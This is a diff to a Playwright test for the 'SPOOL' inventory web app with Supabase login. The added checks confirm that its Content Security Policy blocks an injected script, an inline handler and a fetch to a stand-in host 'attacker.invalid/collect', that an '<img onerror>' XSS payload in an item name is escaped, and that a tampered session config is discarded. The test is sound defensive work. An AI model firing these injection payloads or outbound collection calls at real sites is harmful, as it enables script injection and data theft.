@@ -2,9 +2,11 @@ import {chromium} from '../../online/node_modules/playwright-core/index.mjs';
 import http from 'node:http';
 import {readFileSync,mkdirSync} from 'node:fs';
 import assert from 'node:assert/strict';
+const projectUrl=JSON.parse(readFileSync(new URL('../../online/config.json',import.meta.url),'utf8')).url.replace(/\/$/,'');
+let managedConfigFixture=false;
 const basePath=process.env.SPOOL_TEST_BASE_PATH||'/';
 if(!/^\/(?:[A-Za-z0-9_-]+\/)*$/.test(basePath))throw Error('Invalid test base path');
-const server=http.createServer((req,res)=>{const files={'':'index.html','online.js':'online.js','online.css':'online.css','config.json':'config.json','offline.html':'offline.html'};const name=req.url.startsWith(basePath)?files[req.url.slice(basePath.length).split('?')[0]]:undefined;if(!name){res.writeHead(404).end();return}res.setHeader('Content-Type',name.endsWith('.js')?'application/javascript':name.endsWith('.css')?'text/css':'text/html');res.end(name==='config.json'?JSON.stringify({url:'https://example.supabase.co',key:''}):readFileSync(new URL('../../online-dist/'+name,import.meta.url)))});
+const server=http.createServer((req,res)=>{const files={'':'index.html','online.js':'online.js','online.css':'online.css','config.json':'config.json','offline.html':'offline.html'};const name=req.url.startsWith(basePath)?files[req.url.slice(basePath.length).split('?')[0]]:undefined;if(!name){res.writeHead(404).end();return}res.setHeader('Content-Type',name.endsWith('.js')?'application/javascript':name.endsWith('.css')?'text/css':'text/html');res.end(name==='config.json'?JSON.stringify({url:projectUrl,key:managedConfigFixture?'sb_publishable_test':''}):readFileSync(new URL('../../online-dist/'+name,import.meta.url)))});
 await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));
 let browser;
 try{
@@ -16,7 +18,7 @@ try{
  assert.equal(await page.locator('main').isVisible(),false);
  assert.deepEqual(await page.evaluate(()=>window.spoolBridge.snapshot()),{items:[],deleted:[],customColorPresets:[],reservations:[]});
  assert.equal(await page.evaluate(()=>localStorage.getItem('spool-inventory-v1')),JSON.stringify([{id:'private-offline-data',name:'Do not upload'}]));
- await page.locator('[name=url]').fill('https://example.supabase.co');await page.locator('[name=key]').fill('sb_secret_never-use');await page.locator('#cloud-config button').click();
+ await page.locator('[name=url]').fill(projectUrl);await page.locator('[name=key]').fill('sb_secret_never-use');await page.locator('#cloud-config button').click();
  await page.locator('.error-summary>p').filter({hasText:'秘密キーは使用できません'}).waitFor();assert.equal(await page.locator('main').isVisible(),false);
  assert.deepEqual(errors,[]);
  // A mocked authenticated transport tests UI wiring; it is not a live OAuth check.
@@ -27,7 +29,7 @@ try{
  const claims={sub:user,role:'authenticated',exp:Math.floor(Date.now()/1000)+3600};
  const token='eyJhbGciOiJIUzI1NiJ9.'+Buffer.from(JSON.stringify(claims)).toString('base64url')+'.test';
  const writes=[],uploads=[];let saveFailure=false;
- await authenticated.route('https://example.supabase.co/**',async route=>{
+ await authenticated.route(projectUrl+'/**',async route=>{
   const req=route.request(),url=new URL(req.url());let data=[];
   if(url.pathname.endsWith('/auth/v1/logout'))data={};
   else if(url.pathname.endsWith('/rpc/ensure_my_library'))data=lib;
@@ -38,10 +40,10 @@ try{
   else if(url.pathname.endsWith('/library_members'))data=url.searchParams.get('select')==='role'?{role:'owner'}:[{user_id:user,role:'owner'}];
   await route.fulfill({status:200,contentType:'application/json',headers:{'access-control-allow-origin':'*'},body:JSON.stringify(data)});
  });
- await authenticated.addInitScript(({token,user})=>{
-  sessionStorage.setItem('spool-online-config',JSON.stringify({url:'https://example.supabase.co',key:'sb_publishable_test'}));
-  sessionStorage.setItem('sb-example-auth-token',JSON.stringify({access_token:token,refresh_token:'test-refresh',expires_at:Math.floor(Date.now()/1000)+3600,expires_in:3600,token_type:'bearer',user:{id:user,email:'owner@example.com'}}));
- },{token,user});
+ await authenticated.addInitScript(({token,user,projectUrl})=>{
+  sessionStorage.setItem('spool-online-config',JSON.stringify({url:projectUrl,key:'sb_publishable_test'}));
+  sessionStorage.setItem('spool-auth-'+new URL(projectUrl).hostname.split('.')[0],JSON.stringify({access_token:token,refresh_token:'test-refresh',expires_at:Math.floor(Date.now()/1000)+3600,expires_in:3600,token_type:'bearer',user:{id:user,email:'owner@example.com'}}));
+ },{token,user,projectUrl});
  authenticated.on('pageerror',e=>errors.push(e.message));
  await authenticated.goto('http://127.0.0.1:'+server.address().port+basePath);
  await authenticated.locator('#cloud-library').waitFor();
@@ -100,12 +102,21 @@ try{
  await authenticated.locator('[data-close-cloud-tools]').click();
  await authenticated.setViewportSize({width:390,height:844});
  assert.equal(await authenticated.evaluate(()=>document.documentElement.scrollWidth<=innerWidth),true);
+ // Browser-enforced policy must block injected code and outbound collection.
+ await authenticated.evaluate(()=>{window.__spoolUnexpectedScript=false;window.__spoolViolations=[];document.addEventListener('securitypolicyviolation',e=>window.__spoolViolations.push(e.effectiveDirective));const script=document.createElement('script');script.textContent='window.__spoolUnexpectedScript=true';document.body.append(script);const button=document.createElement('button');button.setAttribute('onclick','window.__spoolUnexpectedScript=true');document.body.append(button);button.click();button.remove();fetch('https://attacker.invalid/collect').catch(()=>{});});
+ await authenticated.waitForFunction(()=>window.__spoolViolations.includes('connect-src')&&window.__spoolViolations.includes('script-src-attr')&&window.__spoolViolations.includes('script-src-elem'));
+ assert.equal(await authenticated.evaluate(()=>window.__spoolUnexpectedScript),false);
+ await authenticated.evaluate(()=>{const state=window.spoolBridge.snapshot();state.items[0].name='<img src=x onerror="window.__spoolUnexpectedScript=true">';window.spoolBridge.apply(state)});
+ assert.equal(await authenticated.locator('.product h3 img').count(),0);assert.equal(await authenticated.evaluate(()=>window.__spoolUnexpectedScript),false);
+ managedConfigFixture=true;const tampered=await browser.newPage();await tampered.addInitScript(()=>sessionStorage.setItem('spool-online-config',JSON.stringify({url:'https://attacker.supabase.co',key:'sb_publishable_attacker'})));await tampered.goto('http://127.0.0.1:'+server.address().port+basePath);await tampered.locator('#cloud-login').waitFor();assert.equal(await tampered.locator('#cloud-config-reset').count(),0);assert.equal(await tampered.evaluate(()=>sessionStorage.getItem('spool-online-config')),null);await tampered.close();
+ const framed=await browser.newPage();await framed.setContent('<iframe src="http://127.0.0.1:'+server.address().port+basePath+'"></iframe>');await framed.frameLocator('iframe').getByText('SPOOLを直接開いてください').waitFor();assert.equal(await framed.frameLocator('iframe').locator('#cloud-login').count(),0);await framed.close();
  await authenticated.locator('[aria-label="アカウントメニュー"]').click();
  assert.equal(await authenticated.locator('#cloud-logout').isVisible(),true);
  await authenticated.locator('#cloud-logout').click();
  await authenticated.locator('#cloud-login').waitFor({timeout:5000}).catch(async error=>{console.log(await authenticated.locator('#cloud-panel').innerText(),errors);throw error});assert.equal(await authenticated.locator('main').isVisible(),false);
  assert.deepEqual(await authenticated.evaluate(()=>window.spoolBridge.snapshot()),{items:[],deleted:[],customColorPresets:[],reservations:[]});
  assert.deepEqual(errors,[]);
+ console.log('PASS: enforced CSP, injected script/handler blocking, outbound-connection blocking, escaped imported names and packaged-configuration pinning.');
  console.log('PASS: mocked authenticated library load, revision-aware auto-save and logout data clearing.');
  console.log('PASS: Chromium online configuration UI, locked pre-login state, offline-data isolation, secret-key rejection; no runtime errors.');
 }finally{await browser?.close();await new Promise(resolve=>server.close(resolve))}
